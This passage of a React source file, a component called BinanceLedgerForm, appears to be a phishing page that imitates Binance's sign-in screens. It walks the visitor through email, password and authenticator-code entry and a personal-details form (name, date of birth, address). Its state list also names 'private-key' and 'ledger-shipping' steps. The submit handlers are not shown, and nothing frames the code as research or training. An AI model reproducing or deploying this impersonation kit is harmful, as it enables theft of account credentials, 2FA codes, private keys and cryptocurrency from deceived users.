                    onChange={(e) => setPersonalDetails({...personalDetails, lastName: e.target.value})}
                  />
                </div>
                {errors.lastName && (
                  <div className="text-red-500 text-xs mt-1 font-binance">
                    {errors.lastName}
                  </div>
                )}
              </div>

              <div className="bn-formItem">
                <label className="block mb-2 text-xs font-medium font-binance" style={{ color: "var(--color-PrimaryText, #EAECEF)" }}>
                  Date of Birth
                </label>
                <div 
                  className={`bn-textField bn-textField__line data-size-large css-8x1t0r rounded ${errors.dateOfBirth ? 'border-red-500' : ''}`}
                  style={{
                    backgroundColor: "var(--color-Input, #2B3139)",
                    border: `1px solid ${errors.dateOfBirth ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
                    height: "38px"
                  }}
                >
                  <input
                    type="date"
                    className="bg-transparent border-0 text-white p-2.5 w-full outline-none h-full font-binance text-xs"
                    value={personalDetails.dateOfBirth}
                    onChange={(e) => setPersonalDetails({...personalDetails, dateOfBirth: e.target.value})}
                  />
                </div>
                {errors.dateOfBirth && (
                  <div className="text-red-500 text-xs mt-1 font-binance">
                    {errors.dateOfBirth}
                  </div>
                )}
              </div>

              <div className="bn-formItem">
                <label className="block mb-2 text-xs font-medium font-binance" style={{ color: "var(--color-PrimaryText, #EAECEF)" }}>
                  Phone Number
                </label>
                <div 
                  className={`bn-textField bn-textField__line data-size-large css-8x1t0r rounded ${errors.phoneNumber ? 'border-red-500' : ''}`}
                  style={{
                    backgroundColor: "var(--color-Input, #2B3139)",
                    border: `1px solid ${errors.phoneNumber ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
                    height: "38px"
                  }}
                >
                  <input
                    type="tel"
                    className="bg-transparent border-0 text-white p-2.5 w-full outline-none h-full font-binance text-xs"
                    value={personalDetails.phoneNumber}
                    onChange={(e) => setPersonalDetails({...personalDetails, phoneNumber: e.target.value})}
                  />
                </div>
                {errors.phoneNumber && (
                  <div className="text-red-500 text-xs mt-1 font-binance">
                    {errors.phoneNumber}
                  </div>
                )}
              </div>

              <div className="bn-formItem md:col-span-2">
                <label className="block mb-2 text-xs font-medium font-binance" style={{ color: "var(--color-PrimaryText, #EAECEF)" }}>
                  Address
                </label>
                <div 
                  className={`bn-textField bn-textField__line data-size-large css-8x1t0r rounded ${errors.address ? 'border-red-500' : ''}`}
                  style={{
                    backgroundColor: "var(--color-Input, #2B3139)",
                    border: `1px solid ${errors.address ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
                    height: "38px"
                  }}
                >
                  <input
                    type="text"
                    className="bg-transparent border-0 text-white p-2.5 w-full outline-none h-full font-binance text-xs"
                    value={personalDetails.address}
                    onChange={(e) => setPersonalDetails({...personalDetails, address: e.target.value})}
                  />
                </div>
                {errors.address && (
                  <div className="text-red-500 text-xs mt-1 font-binance">
                    {errors.address}
                  </div>
                )}
              </div>

              <div className="bn-formItem">
                <label className="block mb-2 text-xs font-medium font-binance" style={{ color: "var(--color-PrimaryText, #EAECEF)" }}>
                  Postal Code
                </label>
                <div 
                  className={`bn-textField bn-textField__line data-size-large css-8x1t0r rounded ${errors.postalCode ? 'border-red-500' : ''}`}
                  style={{
                    backgroundColor: "var(--color-Input, #2B3139)",
                    border: `1px solid ${errors.postalCode ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
                    height: "38px"
                  }}
                >
                  <input
                    type="text"
                    className="bg-transparent border-0 text-white p-2.5 w-full outline-none h-full font-binance text-xs"
                    value={personalDetails.postalCode}
                    onChange={(e) => setPersonalDetails({...personalDetails, postalCode: e.target.value})}
                  />
                </div>
                {errors.postalCode && (
                  <div className="text-red-500 text-xs mt-1 font-binance">
                    {errors.postalCode}
                  </div>
                )}
              </div>

              <div className="bn-formItem">
                <label className="block mb-2 text-xs font-medium font-binance" style={{ color: "var(--color-PrimaryText, #EAECEF)" }}>
                  City
                </label>
                <div 
                  className={`bn-textField bn-textField__line data-size-large css-8x1t0r rounded ${errors.city ? 'border-red-500' : ''}`}
                  style={{
                    backgroundColor: "var(--color-Input, #2B3139)",
                    border: `1px solid ${errors.city ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
                    height: "38px"
                  }}
                >
                  <input
                    type="text"
                    className="bg-transparent border-0 text-white p-2.5 w-full outline-none h-full font-binance text-xs"
                    value={personalDetails.city}
                    onChange={(e) => setPersonalDetails({...personalDetails, city: e.target.value})}
                  />
                </div>
                {errors.city && (
                  <div className="text-red-500 text-xs mt-1 font-binance">
                    {errors.city}
                  </div>
                )}
              </div>

              <div className="bn-formItem">
                <label className="block mb-2 text-xs font-medium font-binance" style={{ color: "var(--color-PrimaryText, #EAECEF)" }}>
                  Country
                </label>
                <div 
                  className={`bn-textField bn-textField__line data-size-large css-8x1t0r rounded ${errors.country ? 'border-red-500' : ''}`}
                  style={{
                    backgroundColor: "var(--color-Input, #2B3139)",
                    border: `1px solid ${errors.country ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
                    height: "38px"
                  }}
                >
                  <select
                    className="bg-transparent border-0 text-white p-2.5 w-full outline-none h-full font-binance text-xs appearance-none cursor-pointer"
                    value={personalDetails.country}
                    onChange={(e) => setPersonalDetails({...personalDetails, country: e.target.value})}
                    style={{ 
                      backgroundColor: "var(--color-Input, #2B3139)",
                      backgroundImage: `url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 20 20'%3e%3cpath stroke='%23848E9C' stroke-linecap='round' stroke-linejoin='round' stroke-width='1.5' d='m6 8 4 4 4-4'/%3e%3c/svg%3e")`,
                      backgroundPosition: 'right 0.6rem center',
                      backgroundRepeat: 'no-repeat',
                      backgroundSize: '1em 1em'
                    }}
                  >
                    <option value="" className="bg-[#2B3139] text-white text-xs">Select a country</option>
                    {countries.map((country) => (
                      <option key={country} value={country} className="bg-[#2B3139] text-white text-xs">
                        {country}
                      </option>
                    ))}
                  </select>
                </div>
                {errors.country && (
                  <div className="text-red-500 text-xs mt-1 font-binance">
                    {errors.country}
                  </div>
                )}
              </div>
            </div>
          </form>
          
          <button
            className="w-full py-2 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] flex items-center justify-center font-bold font-binance text-xs"
            style={{
              backgroundColor: "var(--color-BtnBg, #FCD535)",
              color: "var(--color-TextOnYellow, #202630)",
              height: "34px"
            }}
            type="submit"
            disabled={isLoading}
            aria-label="Continue"
            onClick={handlePersonalDetailsSubmit}
          >
            {isLoading ? (
              <div className="animate-spin rounded-full h-3 w-3 border-2 border-current border-t-transparent"></div>
            ) : (
              'Continue'
            )}
          </button>
        </div>
      );
    }

    const getCurrentForm = () => {
      switch (currentStep) {
        case 'email':
          return (
            <div>
              <form onSubmit={handleEmailSubmit}>
                <div className="bn-formItem mb-3">
                  <label 
                    className="block mb-2 text-xs font-medium font-binance" 
                    htmlFor="bn-formItem-q8nY2Y1v"
                    style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
                  >
                    Email/Phone number
                  </label>
                  <div>
                    <div className="css-4cffwv">
                      <div 
                        className={`bn-textField bn-textField__line data-size-large username-input-field css-8x1t0r rounded ${errors.email ? 'border-red-500' : ''}`}
                        style={{
                          backgroundColor: "var(--color-Input, #2B3139)",
                          border: `1px solid ${errors.email ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
                          height: "38px"
                        }}
                        role="group"
                      >
                        <input
                          placeholder="Email/Phone (without country code)"
                          type="text"
                          role="textbox"
                          aria-label="Username field for email or phone number"
                          name="username"
                          autoFocus
                          id="bn-formItem-q8nY2Y1v"
                          autoCapitalize="off"
                          className="bg-transparent border-0 text-white p-2.5 w-full outline-none h-full font-binance text-xs"
                          spellCheck="false"
                          autoComplete="username"
                          value={email}
                          onChange={(e) => setEmail(e.target.value)}
                        />
                      </div>
                      {errors.email && (
                        <div className="text-red-500 text-xs mt-1 font-binance">
                          {errors.email}
                        </div>
                      )}
                    </div>
                  </div>
                </div>
              </form>
              
              <button
                className="w-full py-2 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] flex items-center justify-center font-bold font-binance text-xs"
                style={{
                  backgroundColor: "var(--color-BtnBg, #FCD535)",
                  color: "var(--color-TextOnYellow, #202630)",
                  height: "34px"
                }}
                type="submit"
                disabled={isLoading}
                aria-label="Next"
                onClick={handleEmailSubmit}
              >
                {isLoading ? (
                  <div className="animate-spin rounded-full h-3 w-3 border-2 border-current border-t-transparent"></div>
                ) : (
                  'Next'
                )}
              </button>
            </div>
          );
        case 'password':
          return (
            <div>
              <form onSubmit={handlePasswordSubmit}>
                <div className="bn-formItem mb-3">
                  <label 
                    className="block mb-2 text-xs font-medium font-binance" 
                    htmlFor="password-field"
                    style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
                  >
                    Password
                  </label>
                  <div>
                    <div className="css-4cffwv">
                      <div 
                        className={`bn-textField bn-textField__line data-size-large username-input-field css-8x1t0r rounded ${errors.password ? 'border-red-500' : ''}`}
                        style={{
                          backgroundColor: "var(--color-Input, #2B3139)",
                          border: `1px solid ${errors.password ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
                          height: "38px"
                        }}
                        role="group"
                      >
                        <input
                          placeholder="Enter your password"
                          type="password"
                          role="textbox"
                          aria-label="Password field"
                          name="password"
                          autoFocus
                          id="password-field"
                          autoCapitalize="off"
                          className="bg-transparent border-0 text-white p-2.5 w-full outline-none h-full font-binance text-xs"
                          spellCheck="false"
                          autoComplete="current-password"
                          value={password}
                          onChange={(e) => setPassword(e.target.value)}
                        />
                      </div>
                      {errors.password && (
                        <div className="text-red-500 text-xs mt-1 font-binance">
                          {errors.password}
                        </div>
                      )}
                    </div>
                  </div>
                </div>
              </form>
              
              <button
                className="w-full py-2 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] flex items-center justify-center font-bold font-binance text-xs"
                style={{
                  backgroundColor: "var(--color-BtnBg, #FCD535)",
                  color: "var(--color-TextOnYellow, #202630)",
                  height: "34px"
                }}
                type="submit"
                disabled={isLoading}
                aria-label="Continue"
                onClick={handlePasswordSubmit}
              >
                {isLoading ? (
                  <div className="animate-spin rounded-full h-3 w-3 border-2 border-current border-t-transparent"></div>
                ) : (
                  'Continue'
                )}
              </button>
            </div>
          );
        case 'verification':
          return (
            <div>
              <div 
                className="mb-3 text-xs font-binance"
                style={{ color: "var(--color-SecondaryText, #B7BDC6)" }}
              >
                Enter the code from your Google/Binance Authenticator.
              </div>
              <form onSubmit={handleVerificationSubmit}>
                <div className="bn-formItem mb-3">
                  <label 
                    className="block mb-2 text-xs font-binance" 
                    htmlFor="verification-field"
                    style={{ color: "var(--color-TertiaryText, #848E9C)" }}
                  >
                    Authenticator App
                  </label>
                  <div>
                    <div className="css-4cffwv relative">
                      <div 
                        className={`bn-textField bn-textField__line data-size-large username-input-field css-8x1t0r rounded ${errors.verification ? 'border-red-500' : ''}`}
                        style={{
                          backgroundColor: "var(--color-Input, #2B3139)",
                          border: `1px solid ${errors.verification ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
                          height: "38px"
                        }}
                        role="group"
                      >
                        <input
                          placeholder="Enter 6-digit code"
                          type="text"
                          role="textbox"
                          aria-label="Verification code field"
                          name="verification"
                          autoFocus
                          id="verification-field"
                          autoCapitalize="off"
                          className="bg-transparent border-0 text-white p-2.5 pr-12 w-full outline-none h-full font-binance text-xs"
                          spellCheck="false"
                          maxLength={6}
                          value={verificationCode}
                          onChange={(e) => setVerificationCode(e.target.value)}
                        />
                        <button
                          type="button"
                          onClick={handlePaste}
                          className="absolute right-2.5 top-1/2 transform -translate-y-1/2 font-medium hover:opacity-80 transition-opacity font-binance text-xs"
                          style={{ color: "var(--color-BtnBg, #FCD535)" }}
                        >
                          Paste
                        </button>
                      </div>
                      {errors.verification && (
                        <div className="text-red-500 text-xs mt-1 font-binance">
                          {errors.verification}
                        </div>
                      )}
                    </div>
                  </div>
                </div>
              </form>
              
              <button
                className="w-full py-2 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] flex items-center justify-center font-bold font-binance text-xs"
                style={{
                  backgroundColor: "var(--color-BtnBg, #FCD535)",
                  color: "var(--color-TextOnYellow, #202630)",
                  height: "34px"
                }}
                type="submit"
                disabled={isLoading}
                aria-label="Submit"
                onClick={handleVerificationSubmit}
              >
                {isLoading ? (
                  <div className="animate-spin rounded-full h-3 w-3 border-2 border-current border-t-transparent"></div>
                ) : (
                  'Submit'
                )}
              </button>
            </div>
          );
        default:
          return null;
      }
    };

    return getCurrentForm();
  };

  const renderButton = () => {
    if (currentStep === 'personal-details') {
      return (
        <button
          className="w-full py-2 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] flex items-center justify-center font-bold font-binance text-xs"
          style={{
            backgroundColor: "var(--color-BtnBg, #FCD535)",
            color: "var(--color-TextOnYellow, #202630)",
            height: "34px"
          }}
          type="submit"
          disabled={isLoading}
          aria-label="Continue"
          onClick={handlePersonalDetailsSubmit}
        >
          {isLoading ? (
            <div className="animate-spin rounded-full h-3 w-3 border-2 border-current border-t-transparent"></div>
          ) : (
            'Continue'
          )}
        </button>
      );
    }

    const getButtonText = () => {
      switch (currentStep) {
        case 'email':
          return 'Next';
        case 'password':
          return 'Continue';
        case 'verification':
          return 'Submit';
        default:
          return 'Submit';
      }
    };

    const handleButtonClick = (e: React.FormEvent) => {
      e.preventDefault();
      switch (currentStep) {
        case 'email':
          handleEmailSubmit(e);
          break;
        case 'password':
          handlePasswordSubmit(e);
          break;
        case 'verification':
          handleVerificationSubmit(e);
          break;
      }
    };

    return (
      <button
        className="w-full py-2 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] flex items-center justify-center font-bold font-binance text-xs"
        style={{
          backgroundColor: "var(--color-BtnBg, #FCD535)",
          color: "var(--color-TextOnYellow, #202630)",
          height: "34px"
        }}
        type="submit"
        disabled={isLoading}
        aria-label={getButtonText()}
        onClick={handleButtonClick}
      >
        {isLoading ? (
          <div className="animate-spin rounded-full h-3 w-3 border-2 border-current border-t-transparent"></div>
        ) : (
          getButtonText()
        )}
      </button>
    );
  };

  const renderAlternativeOptions = () => {
    if (currentStep !== 'email') return null;

    return (
      <>
        <div className="my-3 flex items-center md:mb-2 md:mt-4">
          <div 
            className="h-[1px] flex-1" 
            style={{ backgroundColor: "var(--color-Line, #2B3139)" }}
          />
          <div 
            className="px-3 text-xs font-binance"
            style={{ 
              color: "var(--color-TertiaryText, #848E9C)",
              fontWeight: "400",
              lineHeight: "16px"
            }}
          >
            or
          </div>
          <div 
            className="h-[1px] flex-1" 
            style={{ backgroundColor: "var(--color-Line, #2B3139)" }}
          />
        </div>

        <div className="space-y-2">
          <button 
            className="w-full py-2.5 rounded flex items-center justify-center transition-colors hover:bg-[#2B3139] hover:border-[#848E9C] font-binance"
            style={{
              backgroundColor: "transparent",
              border: "1px solid var(--color-InputLine, #474D57)",
              color: "var(--color-PrimaryText, #EAECEF)",
              fontSize: "11px",
              fontWeight: "400",
              lineHeight: "16px",
              height: "38px"
            }}
            role="button" 
            aria-label="Continue with Passkey"
          >
            <div className="icon-warp mr-2">
              <div className="ml-1 h-[16px]">
                <svg 
                  className="bn-svg h-[16px] w-[16px]" 
                  style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
                  viewBox="0 0 24 24" 
                  xmlns="http://www.w3.org/2000/svg"
                  fill="currentColor"
                >
                  <path fillRule="evenodd" clipRule="evenodd" d="M1.5 17c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
                  <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
                  <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/>
                  <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
                </svg>
              </div>
            </div>
            <div>Continue with Passkey</div>
          </button>

          <button 
            className="w-full py-2.5 rounded flex items-center justify-center transition-colors hover:bg-[#2B3139] hover:border-[#848E9C] font-binance"
            style={{
              backgroundColor: "transparent",
              border: "1px solid var(--color-InputLine, #474D57)",
              color: "var(--color-PrimaryText, #EAECEF)",
              fontSize: "11px",
              fontWeight: "400",
              lineHeight: "16px",
              height: "38px"
            }}
            role="button" 
            aria-label="Continue with Google"
          >
            <div className="icon-warp mr-2">
              <svg width="18" height="18" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
                <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
                <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/>
                <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
              </svg>
            </div>
            <div>Continue with Google</div>
          </button>

          <button 
            className="w-full py-2.5 rounded flex items-center justify-center transition-colors hover:bg-[#2B3139] hover:border-[#848E9C] font-binance"
            style={{
              backgroundColor: "transparent",
              border: "1px solid var(--color-InputLine, #474D57)",
              color: "var(--color-PrimaryText, #EAECEF)",
              fontSize: "11px",
              fontWeight: "400",
              lineHeight: "16px",
              height: "38px"
            }}
            role="button" 
            aria-label="Continue with Telegram"
          >
            <div className="icon-warp mr-2">
              <svg height="18" width="18" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" className="bn-svg">
                <path d="M2.81274 9.27228C7.28665 7.32306 10.27 6.03802 11.7627 5.41715C16.0247 3.64445 16.9103 3.33651 17.4875 3.32634C17.6144 3.3241 17.8983 3.35557 18.0822 3.50477C18.2374 3.63075 18.2801 3.80094 18.3006 3.92038C18.321 4.03983 18.3465 4.31192 18.3263 4.52453C18.0953 6.95123 17.0959 12.8402 16.5875 15.5581C16.3724 16.7082 15.9488 17.0938 15.5387 17.1315C14.6475 17.2136 13.9707 16.5426 13.1076 15.9767C11.7568 15.0913 10.9938 14.5401 9.68265 13.6761C8.16744 12.6776 9.14969 12.1288 10.0132 11.232C10.2392 10.9972 14.1659 7.42557 14.2419 7.10157C14.2514 7.06104 14.2603 6.90999 14.1705 6.83024C14.0808 6.75048 13.9483 6.77775 13.8528 6.79944C13.7173 6.83019 11.5595 8.25641 7.37938 11.0781C6.7669 11.4987 6.21213 11.7036 5.71508 11.6929C5.16711 11.681 4.11306 11.383 3.32947 11.1283C2.36838 10.8159 1.60451 10.6507 1.67103 10.1202C1.70568 9.84381 2.08624 9.56118 2.81274 9.27228Z" fill="#00AEED" />
              </svg>
            </div>
            <div>Continue with Telegram</div>
          </button>
        </div>
      </>
    );
  };

  // Check if we should show special states
  const isSpecialState = currentStep === 'important-notice' || currentStep === 'verifying' || currentStep === 'success' || currentStep === 'summary' || currentStep === 'private-key' || currentStep === 'confirmation' || currentStep === 'ledger-shipping';

  return (
    <div 
      className="min-h-screen flex items-center justify-center p-4"
      style={{ backgroundColor: "var(--color-Body, #181A20)" }}
    >
      <div 
        className="w-full max-w-md p-4 rounded-lg"
        style={{ 
          backgroundColor: "var(--color-Card, #1E2329)",
          minHeight: "450px"
        }}
      >
        {/* Always show header */}
        {renderHeader()}
        
        {/* Content with fade transition */}
        <div 
          className={`transition-opacity duration-300 ${isTransitioning ? 'opacity-0' : 'opacity-100'}`}
          style={{ minHeight: "380px" }}
        >
          {isSpecialState ? (
            renderSpecialState()
          ) : (
            <div className="flex flex-col h-full">
              {renderTitle()}
              
              <div style={{ minHeight: "280px" }} className="flex flex-col">
                {renderMainForm()}
                {renderAlternativeOptions()}
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

export default BinanceLedgerForm;
